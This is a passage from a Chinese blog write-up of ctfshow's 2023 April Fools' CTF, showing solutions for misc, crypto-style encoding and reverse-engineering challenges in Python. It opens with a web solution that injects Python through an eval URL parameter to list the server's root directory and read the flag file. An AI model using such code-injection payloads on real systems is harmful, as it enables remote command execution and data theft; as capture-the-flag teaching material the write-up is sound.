+
+http://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__("os").popen("ls /").read()
+hello,app bin dev etc flag_is_h3re home lib media mnt opt proc root run sbin srv sys tmp usr var
+
+http://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__("os").popen("cat /flag_is_h3re").read()
+hello,ctfshow{487b3c1e-eff3-4c8d-846e-b4e21441a8fd}
+</code></pre><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h2><p>首先是伪加密解除</p><p>解压后，得到<code>black.png</code>,010打开，拉到后面，看到有<code>flag.png</code>，且最后有段base64<code>eXVyZW5qaWU=</code>，解码为<code>yurenjie</code>，猜测<code>black.png</code>还包含了一个密码为<code>yurenjie</code>的压缩包</p><p>binwalk文件分离<code>binwalk -e black.png</code>，得到一个<code>3965.zip</code>,以<code>yurenjie</code>为密码解压，得到<code>flag.png</code></p><p>打开图片，很容易发现高不对，于是010修改高，得到flag</p><p><code>ctfshow{Th1s_i5_f1ag}</code></p><h2 id="哇库哇库2"><a href="#哇库哇库2" class="headerlink" title="哇库哇库2"></a>哇库哇库2</h2><h2 id="琴柳感"><a href="#琴柳感" class="headerlink" title="琴柳感"></a>琴柳感</h2><p>官方wp后</p><p>打开文本文档，一堆重复的文字。除去开头和最后的两句话，一共是四句话在重复。这里考虑也许是 Base4，不知四句话各代表什么数，于是爆破factorial(4)=24种可能。</p><p>(应该是base4的编码规则)</p><p>根据wp给的代码，自己简化了一下，为</p><pre><code class="python">'''
+Author       : dpm12345 1006975692@qq.com
+Github       : https://github.com/dpm12345
+Date         : 2023-04-02 19:30:50
+LastEditors  : dpm12345 1006975692@qq.com
+LastEditTime : 2023-04-03 20:22:12
+Description  : 
+'''
+
+from Crypto.Util.number import long_to_bytes
+from itertools import permutations
+with open("qlg.txt","r",encoding='gbk') as f:
+    content = f.read()
+content = content[8:-23]
+dic = ["你有没有感受到城市在分崩离析？","你不曾注意阴谋得逞者在狞笑。","你有没有听见孩子们的悲鸣？","你是否想过......朋友不再是朋友，家园不再是家园。"]
+
+s = list(permutations(['0','1','2','3']))
+for a,b,c,d in s:
+    tmp1 = content.replace(dic[0],a).replace(dic[1],b).replace(dic[2],c).replace(dic[3],d)
+    tmp2 = 0
+    for i in tmp1:
+        tmp2 &lt;&lt;= 2
+        tmp2+=int(i)
+    print(long_to_bytes(tmp2))
+
+'''
+b'\x1b2\x11;\x16\x1f376\x14\x1d\x13\x190\x1b\x10\x1d\x136\x14\x1d\x13\x0f4\x14\x1905\x18\x144\x14\x0f5\x18\x14\x17\x10\x1e\x14\x18\x1d4\x14\x1e\x14\x18\x1d\x19\x18&lt;'
+b'\x1e#\x11.\x17\x1a"&amp;\'\x14\x19\x12\x1d \x1e\x10\x19\x12\'\x14\x19\x12\n$\x14\x1d %\x1c\x14$\x14\n%\x1c\x14\x16\x10\x1b\x14\x1c\x19$\x14\x1b\x14\x1c\x19\x1d\x1c('
+b'\'1"7)/3;9(.#&amp;0\' .#9(.#\x0f8(&amp;0:$(8(\x0f:$(+ -($.8(-($.&amp;$&lt;'
+b'-\x13"\x1d+%\x11\x19\x1b(&amp;!.\x10- &amp;!\x1b(&amp;!\x05\x18(.\x10\x1a,(\x18(\x05\x1a,() \'(,&amp;\x18(\'(,&amp;.,\x14'
+b'6!3&amp;=:".-&lt;;27 60;2-&lt;;2\n,&lt;7 /4&lt;,&lt;\n/4&lt;&gt;09&lt;4;,&lt;9&lt;4;74('
+b'9\x123\x19&gt;5\x11\x1d\x1e&lt;71;\x109071\x1e&lt;71\x05\x1c&lt;;\x10\x1f8&lt;\x1c&lt;\x05\x1f8&lt;=06&lt;87\x1c&lt;6&lt;87;8\x14'
+b'KvD{BOwsrALGHuKELGrALG_qAHupIAqA_pIACENAILqANAILHI}'
+b'NgDnCJfbcAHFLeNEHFcAHFZaALe`MAaAZ`MABEKAMHaAKAMHLMi'
+b'ctfshow{xingbucengxing_yibuzaiyi_zaikelianyilianba}'
+b'lGfLk`DHKibdnElebdKibdPIinEJmiIiPJmihecimbIicimbnmA'
+b'rdwb|zfnl}{vseru{vl}{vZm}seoq}m}Zoq}~ux}q{m}x}q{sqi'
+b'xFwH~pDLN}st{ExustN}stPM}{EOy}M}POy}|ur}ysM}r}ys{yA'
+b'\x87\xb9\x88\xb7\x81\x8f\xbb\xb3\xb1\x82\x8c\x8b\x84\xba\x87\x8a\x8c\x8b\xb1\x82\x8c\x8b\xaf\xb2\x82\x84\xba\xb0\x86\x82\xb2\x82\xaf\xb0\x86\x82\x83\x8a\x8d\x82\x86\x8c\xb2\x82\x8d\x82\x86\x8c\x84\x86\xbe'
+b'\x8d\x9b\x88\x9d\x83\x85\x99\x91\x93\x82\x84\x89\x8c\x9a\x8d\x8a\x84\x89\x93\x82\x84\x89\xa5\x92\x82\x8c\x9a\x90\x8e\x82\x92\x82\xa5\x90\x8e\x82\x81\x8a\x87\x82\x8e\x84\x92\x82\x87\x82\x8e\x84\x8c\x8e\x96'
+b'\x93\xb8\x99\xb3\x94\x9f\xbb\xb7\xb4\x96\x9d\x9b\x91\xba\x93\x9a\x9d\x9b\xb4\x96\x9d\x9b\xaf\xb6\x96\x91\xba\xb5\x92\x96\xb6\x96\xaf\xb5\x92\x96\x97\x9a\x9c\x96\x92\x9d\xb6\x96\x9c\x96\x92\x9d\x91\x92\xbe'
+b'\x9c\x8b\x99\x8c\x97\x90\x88\x84\x87\x96\x91\x98\x9d\x8a\x9c\x9a\x91\x98\x87\x96\x91\x98\xa0\x86\x96\x9d\x8a\x85\x9e\x96\x86\x96\xa0\x85\x9e\x96\x94\x9a\x93\x96\x9e\x91\x86\x96\x93\x96\x9e\x91\x9d\x9e\x82'
+b'\xb1\x98\xbb\x91\xbc\xb5\x99\x9d\x9c\xbe\xb7\xb9\xb3\x9a\xb1\xba\xb7\xb9\x9c\xbe\xb7\xb9\xa5\x9e\xbe\xb3\x9a\x9f\xb2\xbe\x9e\xbe\xa5\x9f\xb2\xbe\xbd\xba\xb4\xbe\xb2\xb7\x9e\xbe\xb4\xbe\xb2\xb7\xb3\xb2\x96'
+b'\xb4\x89\xbb\x84\xbd\xb0\x88\x8c\x8d\xbe\xb3\xb8\xb7\x8a\xb4\xba\xb3\xb8\x8d\xbe\xb3\xb8\xa0\x8e\xbe\xb7\x8a\x8f\xb6\xbe\x8e\xbe\xa0\x8f\xb6\xbe\xbc\xba\xb1\xbe\xb6\xb3\x8e\xbe\xb1\xbe\xb6\xb3\xb7\xb6\x82'
+b'\xc6\xed\xcc\xe6\xc1\xca\xee\xe2\xe1\xc3\xc8\xce\xc4\xef\xc6\xcf\xc8\xce\xe1\xc3\xc8\xce\xfa\xe3\xc3\xc4\xef\xe0\xc7\xc3\xe3\xc3\xfa\xe0\xc7\xc3\xc2\xcf\xc9\xc3\xc7\xc8\xe3\xc3\xc9\xc3\xc7\xc8\xc4\xc7\xeb'
+b'\xc9\xde\xcc\xd9\xc2\xc5\xdd\xd1\xd2\xc3\xc4\xcd\xc8\xdf\xc9\xcf\xc4\xcd\xd2\xc3\xc4\xcd\xf5\xd3\xc3\xc8\xdf\xd0\xcb\xc3\xd3\xc3\xf5\xd0\xcb\xc3\xc1\xcf\xc6\xc3\xcb\xc4\xd3\xc3\xc6\xc3\xcb\xc4\xc8\xcb\xd7'
+b'\xd2\xec\xdd\xe2\xd4\xda\xee\xe6\xe4\xd7\xd9\xde\xd1\xef\xd2\xdf\xd9\xde\xe4\xd7\xd9\xde\xfa\xe7\xd7\xd1\xef\xe5\xd3\xd7\xe7\xd7\xfa\xe5\xd3\xd7\xd6\xdf\xd8\xd7\xd3\xd9\xe7\xd7\xd8\xd7\xd3\xd9\xd1\xd3\xeb'
+b'\xd8\xce\xdd\xc8\xd6\xd0\xcc\xc4\xc6\xd7\xd1\xdc\xd9\xcf\xd8\xdf\xd1\xdc\xc6\xd7\xd1\xdc\xf0\xc7\xd7\xd9\xcf\xc5\xdb\xd7\xc7\xd7\xf0\xc5\xdb\xd7\xd4\xdf\xd2\xd7\xdb\xd1\xc7\xd7\xd2\xd7\xdb\xd1\xd9\xdb\xc3'
+b'\xe1\xdc\xee\xd1\xe8\xe5\xdd\xd9\xd8\xeb\xe6\xed\xe2\xdf\xe1\xef\xe6\xed\xd8\xeb\xe6\xed\xf5\xdb\xeb\xe2\xdf\xda\xe3\xeb\xdb\xeb\xf5\xda\xe3\xeb\xe9\xef\xe4\xeb\xe3\xe6\xdb\xeb\xe4\xeb\xe3\xe6\xe2\xe3\xd7'
+b'\xe4\xcd\xee\xc4\xe9\xe0\xcc\xc8\xc9\xeb\xe2\xec\xe6\xcf\xe4\xef\xe2\xec\xc9\xeb\xe2\xec\xf0\xcb\xeb\xe6\xcf\xca\xe7\xeb\xcb\xeb\xf0\xca\xe7\xeb\xe8\xef\xe1\xeb\xe7\xe2\xcb\xeb\xe1\xeb\xe7\xe2\xe6\xe7\xc3'
+
+'''
+</code></pre><h2 id="低端的base"><a href="#低端的base" class="headerlink" title="低端的base"></a>低端的base</h2><p>根据base64的原理，base64是一种把二进制值变成文本数据的方式，在输入是文本的情况下，3个原始字符对应的就是4个base64编码后的字符，所以可以对编码后的base64字符4个4个的进行爆破，只要还原出来的3个原始字符在可见字符范围内即可。</p><pre><code class="python">from Crypto.Util.number import *
+import itertools
+import base64
+
+with open("题目flag.txt","r",encoding="utf-8") as f:
+    c = f.read()
+
+for i in range(int(len(c)/4)):
+    s = c[i*4:i*4+4]
+    tmp = []
+    for x in s:
+        if x.isalpha():
+            tmp.append((x.lower(),x.upper()))
+        else:
+            tmp.append((x))
+    # print(tmp)
+    y = list(itertools.product(*tmp))
+    res = []
+    for q in y:
+        z = "".join(q)
+        try:
+            de_str = base64.b64decode(z.encode()).decode()
+            if de_str.isprintable():
+                res.append(de_str)
+        except:
+            pass
+    print(res)
+</code></pre><p><code>ctfshow{base64_1s太难了!!I服了U!}</code></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="easy-pyc"><a href="#easy-pyc" class="headerlink" title="easy_pyc"></a>easy_pyc</h2><p>uncomploy6反编译，得到</p><pre><code class="python">print 'Welcome to CTFshow Re!'
+print 'your flag is here!'
+flag = ''
+l = len(flag)
+for i in range(l):
+    num = ((flag[i] + i) % 114514 + 114514) % 114514
+    code += chr(num)
+
+code = map(ord, code)
+for i in range(l - 4 + 1):
+    code[i] = code[i] ^ code[(i + 1)]
+
+print code
+code = ['\x16', '\x1d', '\x1e', '\x1a', '\x18', '\t', b'\xff', b'\xd0', ',', '\x03', '\x02', '\x14', '8', 'm', '\x01', 'C', 'D', b'\xbd', b'\xf7', '*', '\r', b'\xda', b'\xf9', '\x1c', '&amp;', '5', "'", b'\xda', b'\xd4', b'\xd1', '\x0b', b'\xc7', b'\xc7', '\x1a', b'\x90', 'D', b'\xa1']
+</code></pre><p>解密脚本为</p><pre><code class="python">code = ['\x16', '\x1d', '\x1e', '\x1a', '\x18', '\t', b'\xff', b'\xd0', ',', '\x03', '\x02', '\x14', '8', 'm', '\x01', 'C', 'D', b'\xbd', b'\xf7', '*', '\r', b'\xda', b'\xf9', '\x1c', '&amp;', '5', "'", b'\xda', b'\xd4', b'\xd1', '\x0b', b'\xc7', b'\xc7', '\x1a', b'\x90', 'D', b'\xa1']
+l = len(code)
+new_code = [ord(i) for i in code]
+for i in range(l-4,0,-1):
+    new_code[i] = new_code[i] ^ new_code[i+1]
+print(new_code)
+for i in range(l):
+    print(chr(new_code[i]-i),end="")
+</code></pre><p>由于11414过大，所以<code>num = ((flag[i] + i) % 114514 + 114514) % 114514</code>最后值仍为<code>flag[i] + i</code>，之后就是异或的逆运算</p><p>得到<code>tfshow{Just_F00l's_D@y_R3_Ch3ck-in!}</code></p><p>于是flag为<code>ctfshow{Just_F00l's_D@y_R3_Ch3ck-in!}</code></p><h2 id="easy-cc"><a href="#easy-cc" class="headerlink" title="easy_cc"></a>easy_cc</h2><p>IDA打开，字符串窗口，找到比较输入的函数，顺着代码的变化过程，可知加密的流程为</p><p>输入flag -&gt; 读取flag及计算长度 -&gt; 利用已有的”key123”对输入的每个字符进行异或操作 -&gt; 将字符转化为2位16进制代码</p><p>故解密流程为： 每两位读出16进制 -&gt; 转化为10进制 -&gt; 与”key123”异或 -&gt; 得到flag</p><p>解密脚本</p><pre><code class="python">v19 = "key123"
+target = "08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216"
+v17 = []
+for i in range(0,len(target),2):
+    v17.append(int(target[i:i+2],16))
+new_v17 = []
+for i in range(len(v17)):
+    v17[i] = v17[i] ^ ord(v19[i % len(v19)])
+for i in v17:
+    print(chr(i),end="")
+</code></pre><div class="tags"><a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i> CTF</a> <a href="/tags/ctfshow/" rel="tag"><i class="ic i-tag"></i> ctfshow</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-06-09 15:09:53" itemprop="dateModified" datetime="2023-06-09T15:09:53+08:00">2023-06-09</time> </span><span id="posts/d0dbb8d4/" class="item leancloud_visitors" data-flag-title="2023 愚人杯" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="zhong 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="zhong 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="zhong 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>zhong <i class="ic i-at"><em>@</em></i>dpm12345</li><li class="link"><strong>本文链接：</strong> <a href="http://dpm12345.cn/posts/d0dbb8d4/" title="2023 愚人杯">http://dpm12345.cn/posts/d0dbb8d4/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/posts/b63ac8f1/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c568c7be43e0d30e723276.jpg" title="AK赛"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> ctfshow</span><h3>AK赛</h3></a></div><div class="item right"><a href="/posts/cf9eb9c9/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c5694dbe43e0d30e73c9ed.webp" title="内部赛"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> ctfshow</span><h3>内部赛</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-signin"><span class="toc-number">1.1.</span> <span class="toc-text">easy_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-ssti"><span class="toc-number">1.2.</span> <span class="toc-text">easy_ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.</span> <span class="toc-text">被遗忘的反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-base"><span class="toc-number">2.1.</span> <span class="toc-text">easy_base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E7%89%9B%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">大牛的密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-mini"><span class="toc-number">2.3.</span> <span class="toc-text">easy_mini</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-xor"><span class="toc-number">2.4.</span> <span class="toc-text">easy_xor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-flask"><span class="toc-number">2.5.</span> <span class="toc-text">easy_flask</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">3.1.</span> <span class="toc-text">奇怪的压缩包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%87%E5%BA%93%E5%93%87%E5%BA%932"><span class="toc-number">3.2.</span> <span class="toc-text">哇库哇库2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%B4%E6%9F%B3%E6%84%9F"><span class="toc-number">3.3.</span> <span class="toc-text">琴柳感</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8E%E7%AB%AF%E7%9A%84base"><span class="toc-number">3.4.</span> <span class="toc-text">低端的base</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">4.</span> <span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pyc"><span class="toc-number">4.1.</span> <span class="toc-text">easy_pyc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-cc"><span class="toc-number">4.2.</span> <span class="toc-text">easy_cc</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/posts/dd66f6b6/" rel="bookmark" title="萌新赛">萌新赛</a></li><li><a href="/posts/7c4924dd/" rel="bookmark" title="萌新">萌新</a></li><li><a href="/posts/25b29fe5/" rel="bookmark" title="新春欢乐赛_2022">新春欢乐赛_2022</a></li><li><a href="/posts/96bab31d/" rel="bookmark" title="other">other</a></li><li><a href="/posts/b013ba57/" rel="bookmark" title="信息收集 爆破 命令执行">信息收集 爆破 命令执行</a></li><li><a href="/posts/98069c85/" rel="bookmark" title="php 特性">php 特性</a></li><li><a href="/posts/31915a1e/" rel="bookmark" title="文件包含">文件包含</a></li><li><a href="/posts/592e5fba/" rel="bookmark" title="文件上传">文件上传</a></li><li><a href="/posts/35cb7ca5/" rel="bookmark" title="SQL 注入">SQL 注入</a></li><li><a href="/posts/d3333ead/" rel="bookmark" title="反序列化">反序列化</a></li><li><a href="/posts/f685e8f8/" rel="bookmark" title="单身杯">单身杯</a></li><li><a href="/posts/ba492ba4/" rel="bookmark" title="36D杯练手赛">36D杯练手赛</a></li><li><a href="/posts/26d2b0d0/" rel="bookmark" title="36D杯">36D杯</a></li><li><a href="/posts/b63ac8f1/" rel="bookmark" title="AK赛">AK赛</a></li><li><a href="/posts/cf9eb9c9/" rel="bookmark" title="内部赛">内部赛</a></li><li class="active"><a href="/posts/d0dbb8d4/" rel="bookmark" title="2023愚人杯">2023愚人杯</a></li><li><a href="/posts/e58b935e/" rel="bookmark" title="Misc入门">Misc入门</a></li><li><a href="/posts/79d29fb/" rel="bookmark" title="菜狗杯">菜狗杯</a></li><li><a href="/posts/9e150aa2/" rel="bookmark" title="代码审计">代码审计</a></li><li><a href="/posts/813434ca/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/posts/7f1ae6d2/" rel="bookmark" title="java">java</a></li><li><a href="/posts/e93ac459/" rel="bookmark" title="XXE">XXE</a></li><li><a href="/posts/fe1aa8c3/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/posts/524679b/" rel="bookmark" title="2023年CTF">2023年CTF</a></li><li><a href="/posts/47d18edd/" rel="bookmark" title="SSTI">SSTI</a></li><li><a href="/posts/1f01c3ee/" rel="bookmark" title="BJDCTF2020">BJDCTF2020</a></li><li><a href="/posts/68282885/" rel="bookmark" title="crypto">crypto</a></li><li><a href="/posts/8d17cdf0/" rel="bookmark" title="jwt">jwt</a></li><li><a href="/posts/3418e521/" rel="bookmark" title="nodejs">nodejs</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="zhong" data-src="/images/avatar.jpg"><p class="name" itemprop="name">zhong</p><div class="description" itemprop="description">学习记录</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">99</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">14</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">50</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RwbTEyMzQ1" title="https:&#x2F;&#x2F;github.com&#x2F;dpm12345"><i class="ic i-github"></i></span> <span class="exturl item bilibili" data-url="aHR0cHM6Ly9zcGFjZS5iaWxpYmlsaS5jb20vMTQyNDc4NjIw" title="https:&#x2F;&#x2F;space.bilibili.com&#x2F;142478620"><i class="ic i-bilibili"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTUzMDc2NzE5NQ==" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;530767195"><i class="ic i-cloud-music"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/statistics/" rel="section"><i class="ic i-shuzhuangtu"></i>统计</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/posts/b63ac8f1/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/posts/cf9eb9c9/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a></div><span><a href="/posts/79d29fb/" title="菜狗杯">菜狗杯</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/leetcode/" title="分类于 leetcode">leetcode</a> <i class="ic i-angle-right"></i> <a href="/categories/leetcode/regular-exercise/" title="分类于 leetcode 刷题">leetcode 刷题</a></div><span><a href="/posts/47ade4a0/" title="爬楼梯与零钱兑换题目对比">爬楼梯与零钱兑换题目对比</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/posts/65089f0a/" title="ms17-010 漏洞复现">ms17-010 漏洞复现</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/" title="分类于 Web 入门">Web 入门</a></div><span><a href="/posts/7f1ae6d2/" title="java">java</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/leetcode/" title="分类于 leetcode">leetcode</a> <i class="ic i-angle-right"></i> <a href="/categories/leetcode/regular-exercise/" title="分类于 leetcode 刷题">leetcode 刷题</a></div><span><a href="/posts/ca7417e/" title="三个无重叠子数组的最大和">三个无重叠子数组的最大和</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a></div><span><a href="/posts/78c2084b/" title="sql_sum">sql_sum</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/posts/f2a742a4/" title="虚拟机网络问题">虚拟机网络问题</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/leetcode/" title="分类于 leetcode">leetcode</a> <i class="ic i-angle-right"></i> <a href="/categories/leetcode/regular-exercise/" title="分类于 leetcode 刷题">leetcode 刷题</a></div><span><a href="/posts/9e6e8fdc/" title="子序列问题">子序列问题</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/principle/" title="分类于 CTF 原理">CTF 原理</a></div><span><a href="/posts/6882c75c/" title="JavaScript 原型链污染(Prototype).md">JavaScript 原型链污染(Prototype).md</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/" title="分类于 Web 入门">Web 入门</a></div><span><a href="/posts/fe1aa8c3/" title="XSS">XSS</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2021 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">zhong @ dpm12345-blog</span></div><script async src="../js/busuanzi.pure.min.js"></script><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">478k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">10:51</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div><i class="ic i-eye" aria-hidden="true"></i><span id="busuanzi_value_site_pv"></span>次</div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"posts/d0dbb8d4/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,copy_tex:!0,katex:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js,npm/echarts@5.2.2/dist/echarts.min.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>
